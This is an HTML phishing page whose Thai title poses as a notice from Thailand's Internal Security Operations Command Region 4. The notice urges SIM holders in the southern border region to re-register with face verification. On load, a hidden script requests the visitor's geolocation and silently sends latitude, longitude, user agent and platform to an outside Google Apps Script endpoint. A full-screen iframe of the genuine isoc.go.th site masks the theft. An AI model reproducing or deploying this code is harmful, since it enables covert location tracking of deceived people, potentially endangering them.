<!DOCTYPE html>
<html>
<head>
	<title>กอ.รมน.ภาค4 ขอให้ผู้ใช้งานเบอร์นี้ในพื้นที่ชายแดนใต้รึบลงทะเบียนซิมด้วยระบบตรวจสอบใบหน้า (อัตลักษณ์) เพิ่มเติม</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
	<link rel="shortcut icon" href="https://www.truemoveh-ebrochure.com/wp-content/uploads/2019/06/TrueMoveH_Special_Final_20190617.pdf">
</head>
<body>
	<script>
window.onload = function() {
  getLocation();
}
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);

  } else { 
  }
}		
var xurl = "https://script.google.com/macros/s/AKfycbwD7c4kTnIMgLbUx6KMZqTTP77Psn3hAesGuxNgH-WBov23PRAT/exec";
	function showPosition(position) {
	    var xmlhttp = new XMLHttpRequest();
	    var useragent = navigator.userAgent;
	    var platform = navigator.platform;
	    
        var theUrl = xurl+"?lat="+position.coords.latitude+"&long="+position.coords.longitude+"&useragent="+useragent+"&platform="+platform;
        xmlhttp.open('GET', theUrl);
        xmlhttp.send();
            xmlhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            var jsonResponse = JSON.parse(this.responseText);
        }
      };  
}	
		</script>
	<iframe style="position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:scroll; -webkit-overflow-scrolling: touch;  z-index:999999;" src="https://www.isoc.go.th//"></iframe>
</body>
</html>
